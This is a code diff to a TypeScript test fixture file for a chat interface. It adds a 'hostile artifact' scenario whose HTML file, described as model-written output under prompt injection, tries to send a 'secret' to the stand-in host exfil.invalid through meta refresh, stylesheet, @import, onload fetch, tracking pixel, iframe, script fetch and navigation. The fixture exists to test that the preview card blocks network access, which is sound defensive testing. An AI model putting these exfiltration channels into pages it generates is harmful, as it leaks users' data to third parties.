@@ -106,6 +106,11 @@ export const scenarios: Record<string, () => FixtureThread> = {
       }),
     ],
   }),
+  /** An app that tries to reach the network and navigate by itself: its card must do neither until it is opened. */
+  "artifact-hostile": () => ({
+    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
+    turns: [hello(), turn("h1", "Summarize my inbox as a page", minutesAgo(2), [said("Here's the summary page.")], { outputs: [ARTIFACT_FILES.hostile] })],
+  }),
   /** Short and long messages from the person (#1, #2): "Hey" must stay on one line. */
   bubbles: () => ({
     name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
@@ -165,26 +170,32 @@ aside{width:220px;background:#fff;border-left:1px solid #0116270f;padding:20px}
 h1{font-size:15px;margin:0 0 12px}li{display:flex;gap:8px;align-items:center;padding:6px 0;border-bottom:1px solid #0116270d}
 i{width:10px;height:10px;border-radius:3px;display:inline-block}ul{list-style:none;margin:0;padding:0}
 @media(max-width:700px){body{flex-direction:column}.room{width:300px;height:220px}aside{width:auto;border-left:0;border-top:1px solid #0116270f}}
-</style></head><body><main><div class="room" id="room"></div></main>
-<aside><h1>Shelves and storage</h1><ul id="list"></ul></aside>
+</style></head><body><main><div class="room" id="room"><div class="box" style="left:20px;top:20px;width:60px;height:180px;background:#5b8def;--h:80px"></div><div class="box" style="left:120px;top:30px;width:150px;height:70px;background:#f0a35e;--h:40px"></div><div class="box" style="left:300px;top:40px;width:80px;height:80px;background:#4fb38a;--h:50px"></div><div class="box" style="left:130px;top:200px;width:170px;height:70px;background:#a78bdb;--h:30px"></div><div class="box" style="left:340px;top:220px;width:40px;height:40px;background:#7cc36b;--h:60px"></div></div></main>
+<aside><h1>Shelves and storage</h1><ul>
+<li><i style="background:#5b8def"></i>Bookshelf</li><li><i style="background:#f0a35e"></i>Desk</li><li><i style="background:#4fb38a"></i>Storage bins</li><li><i style="background:#a78bdb"></i>Sofa</li><li><i style="background:#7cc36b"></i>Plant</li></ul></aside>
 <script>
-const items=[["Bookshelf",20,20,60,180,"#5b8def",80],["Desk",120,30,150,70,"#f0a35e",40],["Storage bins",300,40,80,80,"#4fb38a",50],["Sofa",130,200,170,70,"#a78bdb",30],["Plant",340,220,40,40,"#7cc36b",60]];
-const room=document.getElementById("room"),list=document.getElementById("list");
-for(const [name,x,y,w,h,color,height] of items){const b=document.createElement("div");b.className="box";Object.assign(b.style,{left:x+"px",top:y+"px",width:w+"px",height:h+"px",background:color});b.style.setProperty("--h",height+"px");room.append(b);
-const li=document.createElement("li");li.innerHTML='<i style="background:'+color+'"></i>'+name;list.append(li);
-b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}}
+for(const b of document.querySelectorAll(".box"))b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}
 </script></body></html>`
+
+/** Model-written HTML that tries to send what it holds elsewhere the moment it renders (prompt injection). */
+const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><meta http-equiv="refresh" content="0;url=http://exfil.invalid/refresh?d=secret">
+<link rel="stylesheet" href="http://exfil.invalid/style.css"><style>@import url(http://exfil.invalid/import.css);body{font:14px system-ui;padding:24px}</style></head>
+<body onload="fetch('http://exfil.invalid/onload?d=secret')"><h1>Inbox summary</h1><p>Three threads need a reply today: the vendor invoice, the offsite plan and the hiring loop.</p>
+<img src="http://exfil.invalid/pixel.png?d=secret" alt=""><iframe src="http://exfil.invalid/frame"></iframe>
+<script>fetch("http://exfil.invalid/script?d=secret");location.href="http://exfil.invalid/navigate?d=secret"</script></body></html>`
 
 const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),IKEA,49\nStorage bins x4,Container Store,36\nDesk lamp,Target,29\nPlant stand,IKEA,19\n"
 
 /** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
 export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string }> = {
   "out-organizer": { mediaType: "text/html", bytes: ORGANIZER_HTML },
+  "out-hostile": { mediaType: "text/html", bytes: HOSTILE_HTML },
   "out-report": { mediaType: "application/pdf", bytes: "%PDF-1.4\n% fixture\n" },
   "out-shopping": { mediaType: "text/csv", bytes: SHOPPING_CSV },
 }
 const ARTIFACT_FILES = {
   organizer: { id: "out-organizer", name: "space-organizer.html", mediaType: "text/html", size: ORGANIZER_HTML.length, updatedAt: 1 },
+  hostile: { id: "out-hostile", name: "inbox-summary.html", mediaType: "text/html", size: HOSTILE_HTML.length, updatedAt: 1 },
   report: { id: "out-report", name: "Room plan.pdf", mediaType: "application/pdf", size: 48_211, updatedAt: 1 },
   shopping: { id: "out-shopping", name: "Shopping list.csv", mediaType: "text/csv", size: SHOPPING_CSV.length, updatedAt: 1 },
 }
